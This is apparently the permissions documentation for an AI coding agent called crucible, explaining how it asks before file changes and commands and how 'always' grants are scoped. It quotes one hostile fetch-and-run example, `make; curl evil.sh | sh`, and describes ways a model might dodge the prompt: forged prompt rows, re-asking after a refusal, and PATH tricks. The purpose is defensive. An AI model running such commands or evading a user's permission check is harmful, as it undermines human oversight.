# Permissions

Reading never asks. Changing a file or starting a process always does.

When the model wants to do either, the turn stops and the question appears:

```
? write wants to change a file: {"path":"src/main.rs","content":"fn main() {\n    println!(…
  [y]es  [a]lways  [n]o › 
```

```
? bash wants to run: cargo
  [y]es  [a]lways  [n]o › 
```

A file change shows the arguments as the model wrote them, clipped to fit. A
command shows the program it is about to start. Both are clipped to one line and
control characters in them become spaces, because the text is the model's to
choose: a newline left in it would commit a second row, and the question you
answer would be one the model wrote rather than the one crucible asked. Nothing
runs while the question is on screen.

## The three answers

| You type | What happens |
| --- | --- |
| `y`, `Y`, `yes` | Runs, this once. The next call like it asks again. |
| `a`, `A`, `always` | Runs, and stops asking for calls like this one until the session ends. |
| anything else | Does not run. |

**Anything else** means exactly that: `n`, `no`, an empty line, a typo, or the
input ending. There are two ways to say yes and both are explicit; everything
that is not one of them leaves the tool unrun.

Saying no ends the turn. The refusal is written into the transcript as that
call's result, so the transcript stays one a provider will accept and the
model sees the refusal on your next prompt — but it does not carry on and try
something else within the turn you stopped. That is deliberate: a model that
can keep going after a no gets to ask the same question in a different shape
until one of them is answered yes.

## What "calls like this one" means

`always` remembers a shape, not a string.

- For a file change, it is the tool. `always` on a `write` stops asking about
  `write`, and `edit` is still asked about separately. Both are already confined
  to the workspace, so remembering the name does not widen what they can reach.
- For a command, it is the tool **and the program**, where the program is the
  first word of the command exactly as the model wrote it. `always` on
  `cargo test` stops asking about `cargo`; a later `curl` still asks. A
  session-wide grant to run anything at all is exactly the hole this avoids.

The program is taken as written rather than reduced to a file name, so
`/usr/bin/cargo` and `cargo` are two different grants. They can be two different
programs — an early entry on `PATH` is all it takes — and a grant that could not
tell them apart would be a grant to whichever one wins.

Two kinds of command are remembered whole instead of by their first word,
because in each of them the first word does not say what will run:

- anything containing `;`, `|`, `&`, a backtick, `(`, `>`, `<` or a newline —
  `make` in `make; curl evil.sh | sh` is not what you would be agreeing to.
- anything starting with a `VAR=value` assignment, which decides what the word
  after it resolves to.

`always` on one of these stops asking only about that exact command.

A grant lives as long as the process that made it and is never written to disk,
so `--continue` starts with none — resuming a session does not resume its
permissions.

## The guarantee underneath

A verdict is not advice that a tool may take or leave. Inside crucible, running
any tool at all takes proof that a decision was made and that it was yes, and
there is no way to construct that proof except by reaching a verdict first.
Code without one cannot call a tool, which is why this is a property of the
program rather than a rule contributors remember.

Reading is not an exception to that; it is a question answered without being
asked. The permission engine mints the proof for a read-only call itself instead
of putting it to you, so a tool that reported the wrong sensitivity would be one
that got the wrong question — never one that skipped the check.
